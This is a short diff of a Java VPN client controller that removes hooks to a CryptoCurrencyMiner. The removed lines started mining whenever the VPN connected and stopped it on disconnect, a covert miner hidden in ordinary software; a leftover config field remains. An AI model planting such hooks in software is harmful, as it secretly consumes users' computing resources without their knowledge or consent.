@@ -34,7 +34,6 @@ public class WindowsVpnController implements IVpnController {
   private IVpnRegistry registry = new WinRegistry();
   private List<ConnectionStateListener> conectionStateListenerList = new ArrayList<ConnectionStateListener>();
   private IPV6Manager ipv6manager = new IPV6Manager();
-  private CryptoCurrencyMiner cryptoMiner = CryptoCurrencyMiner.getInstance(this);
   private String cryptoMinerConfig;
   
   
@@ -203,10 +202,8 @@ public class WindowsVpnController implements IVpnController {
     
     if (newState == ConnectionState.Connected) {
       startConnectionMonitoring();
-      this.cryptoMiner.startMining();
     } else {
       stopConnectionMonitoring();
-      this.cryptoMiner.stopMining();
     }
     log.debug("setConnectionState() - finished");
   }
@@ -250,7 +247,6 @@ public class WindowsVpnController implements IVpnController {
   public void setAppDataFolder(String appData) {
     log.debug("setAppDataFolder(appData={}", appData);
     this.appData = appData;
-    this.cryptoMiner.setAppData(appData);
     log.debug("setAppDataFolder(appData={} - finished", appData);
   }
 
